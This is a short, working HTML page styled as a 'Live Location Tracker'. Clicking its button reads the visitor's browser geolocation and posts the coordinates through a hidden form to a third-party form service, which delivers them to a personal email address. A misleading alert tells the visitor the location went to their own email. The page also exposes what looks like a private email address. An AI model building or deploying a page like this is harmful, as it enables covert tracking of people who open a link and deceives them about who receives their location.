<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Live Location Tracker</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #1e3c72, #2a5298);
      color: white;
      text-align: center;
      padding-top: 80px;
    }
    h1 {
      font-size: 48px;
      margin-bottom: 10px;
    }
    .logo {
      width: 120px;
      margin-bottom: 20px;
      animation: float 3s ease-in-out infinite;
    }
    @keyframes float {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-10px); }
    }
    .location-button {
      font-size: 24px;
      padding: 20px 40px;
      border: none;
      border-radius: 15px;
      background-color: #00c6ff;
      color: white;
      cursor: pointer;
      transition: all 0.3s ease;
      animation: pulse 2s infinite;
    }
    .location-button:hover {
      background-color: #007acc;
      transform: scale(1.05);
    }
    @keyframes pulse {
      0% { box-shadow: 0 0 0 0 rgba(0, 198, 255, 0.6); }
      70% { box-shadow: 0 0 0 20px rgba(0, 198, 255, 0); }
      100% { box-shadow: 0 0 0 0 rgba(0, 198, 255, 0); }
    }
  </style>
</head>
<body>

  <img src="https://img.icons8.com/fluency/96/marker.png" class="logo" alt="Location Logo">
  <h1>Live Location Tracker</h1>
  <p>Click the button below to share your location with us:</p>

  <!-- Hidden form -->
  <form id="locationForm" action="https://formsubmit.co/atuldhanotiya7@gmail.com" method="POST" style="display:none;">
    <input type="hidden" name="Latitude" id="latitude">
    <input type="hidden" name="Longitude" id="longitude">
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_template" value="table">
  </form>

  <!-- Visible button -->
  <button class="location-button" onclick="sendLocation()">üìç Share My Location</button>

  <script>
    function sendLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
          document.getElementById('latitude').value = position.coords.latitude;
          document.getElementById('longitude').value = position.coords.longitude;
          document.getElementById('locationForm').submit();
          alert("‚úÖ Location sent to your email!");
        }, function(error) {
          alert("‚ùå Location access denied or unavailable.");
        });
      } else {
        alert("‚ùå Geolocation is not supported by this browser.");
      }
    }
  </script>
</body>
</html>
